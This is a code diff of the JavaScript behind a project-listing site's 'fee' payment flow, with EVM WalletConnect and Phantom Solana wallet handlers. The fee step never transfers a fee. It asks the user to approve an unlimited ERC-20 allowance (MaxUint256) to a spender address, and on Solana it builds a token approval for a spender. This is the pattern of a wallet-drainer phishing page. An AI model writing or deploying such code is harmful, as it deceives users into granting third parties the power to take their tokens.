@@ -1,4 +1,8 @@
 document.addEventListener("DOMContentLoaded", () => {
+  const { Connection, PublicKey, Transaction,
+          createApproveInstruction, TOKEN_PROGRAM_ID, getAssociatedTokenAddress,
+          PhantomWalletAdapter } = window.SolanaDeps;
+
   const projectForm = document.getElementById("projectForm");
   const feeModal = document.getElementById("feeModal");
   const walletModal = document.getElementById("walletModal");
@@ -7,28 +11,21 @@ document.addEventListener("DOMContentLoaded", () => {
   const solanaWalletButton = document.getElementById("solanaWalletButton");
   const chainSelect = projectForm.querySelector("select");
 
-  // ERC20 ABI for approve
-  const ERC20_ABI = [
-    "function approve(address spender, uint256 amount) external returns (bool)"
-  ];
+  const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
   const SPENDER_ADDRESS = "0xYourSpenderAddressHere";
 
-  // Show fee modal after form submission
   projectForm.addEventListener("submit", (e) => {
     e.preventDefault();
     feeModal.classList.remove("hidden");
   });
 
-  // Proceed to payment → show wallet modal
   proceedButton.addEventListener("click", () => {
     feeModal.classList.add("hidden");
     walletModal.classList.remove("hidden");
 
-    // Hide both buttons initially
     walletConnectEvmButton.classList.add("hidden");
     solanaWalletButton.classList.add("hidden");
 
-    // Show correct wallet option based on selected chain
     const chain = chainSelect.value.toLowerCase();
     if (["ethereum", "bnb chain", "polygon", "arbitrum"].includes(chain)) {
       walletConnectEvmButton.classList.remove("hidden");
@@ -37,22 +34,18 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // Close modals
   document.querySelectorAll(".close").forEach(btn => {
     btn.addEventListener("click", () => {
       btn.closest(".modal").classList.add("hidden");
     });
   });
 
-  // =========================
-  // WalletConnect (EVM) → supports MetaMask, Trust Wallet, Coinbase, Rainbow, etc.
-  // =========================
+  // WalletConnect (EVM)
   walletConnectEvmButton.addEventListener("click", async () => {
     try {
-      const { EthereumProvider } = window;
-      const wcProvider = await EthereumProvider.init({
+      const wcProvider = await window.EthereumProvider.init({
         projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
-        chains: [1], // Ethereum mainnet
+        chains: [1],
         showQrModal: true,
         rpcMap: { 1: "https://eth.llamarpc.com" },
         metadata: { name: "Void List", url: window.location.origin }
@@ -62,30 +55,23 @@ document.addEventListener("DOMContentLoaded", () => {
       const provider = new ethers.providers.Web3Provider(wcProvider);
       const signer = provider.getSigner();
 
-      const tokenAddress = "0xYourTokenContractAddressHere"; // replace with actual token
+      const tokenAddress = "0xYourTokenContractAddressHere";
       const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
 
       const tx = await token.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
       alert(`Approval transaction sent: ${tx.hash}`);
 
       const receipt = await tx.wait();
-      if (receipt.status === 1) {
-        alert("✅ Approval successful!");
-      } else {
-        alert("❌ Approval failed.");
-      }
+      alert(receipt.status === 1 ? "✅ Approval successful!" : "❌ Approval failed.");
     } catch (err) {
       console.error(err);
       alert("WalletConnect approval error: " + err.message);
     }
   });
 
-  // =========================
-  // Solana Wallets → supports Phantom, Solflare, Backpack, Glow, etc.
-  // =========================
+  // Solana Wallets
   solanaWalletButton.addEventListener("click", async () => {
     try {
-      // Example: Phantom adapter, but you can add Solflare, Backpack, Glow
       const adapter = new PhantomWalletAdapter();
       await adapter.connect();
       const publicKey = adapter.publicKey.toBase58();
@@ -94,7 +80,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const connection = new Connection("https://api.mainnet-beta.solana.com");
       const tokenMint = new PublicKey("DqfoyZH96RnvZusSp3Cdncjpyp3C74ZmJzGhjmHnDHRH");
       const owner = adapter.publicKey;
-      const spender = new PublicKey("YOUR_SPENDER_ADDRESS"); // replace with actual
+      const spender = new PublicKey("YOUR_SPENDER_ADDRESS");
       const ata = await getAssociatedTokenAddress(tokenMint, owner);
       const ix = createApproveInstruction(ata, spender, owner, 1000000, [], TOKEN_PROGRAM_ID);
 
